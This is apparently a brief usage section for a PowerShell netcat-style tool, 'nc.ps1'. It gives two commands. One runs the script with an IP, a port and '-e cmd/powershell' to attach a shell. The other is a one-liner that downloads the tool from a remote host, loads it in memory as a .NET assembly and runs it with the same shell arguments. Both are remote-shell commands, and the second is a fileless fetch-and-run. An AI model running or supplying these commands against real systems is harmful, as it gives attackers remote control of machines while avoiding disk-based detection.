# Usage
```
\nc.ps1 <IP> <PORT> -e <cmd/powershell>
```

```
$a=[Reflection.Assembly]::Load([Convert]::FromBase64String((iwr http://<IP>/nc.ps1 -useb).Content)); $a.EntryPoint.Invoke($null, @(,[string[]]@("<IP>","<PORT>","-e","<cmd/powershel>")))
```
